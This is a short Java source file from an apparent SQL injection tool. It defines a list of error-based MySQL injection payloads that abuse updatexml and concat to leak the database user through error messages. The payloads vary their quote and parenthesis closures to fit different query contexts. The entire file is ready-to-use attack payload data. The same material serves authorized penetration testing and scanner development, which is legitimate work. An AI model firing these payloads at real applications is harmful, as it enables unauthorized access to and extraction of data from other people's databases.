package com.sql.sqlinjecttool.payload;

import java.util.Arrays;
import java.util.List;

public class ErrorPayload {
    public static List errorPayload= Arrays.asList(
            " and updatexml(1,concat(0x3a,user(),0x3a),1) and  1=1 ",
            ") and updatexml(1,concat(0x3a,user(),0x3a),1) and (1=1  ",
            "' and updatexml(1,concat(0x3a,user(),0x3a),1) and '1'='1 ",
            "') and updatexml(1,concat(0x3a,user(),0x3a),1) and ('1'='1",
            "\" and updatexml(1,concat(0x3a,user(),0x3a),1) and \"A\"=\"A",
            " and updatexml(1,concat(0x3a,user(),0x3a),1) # ",
            ") and updatexml(1,concat(0x3a,user(),0x3a),1) #",
            "' and updatexml(1,concat(0x3a,user(),0x3a),1) #",
            "') and updatexml(1,concat(0x3a,user(),0x3a),1) #",
            "\" and updatexml(1,concat(0x3a,user(),0x3a),1) #",
            "\") and updatexml(1,concat(0x3a,user(),0x3a),1) # "
    );
}
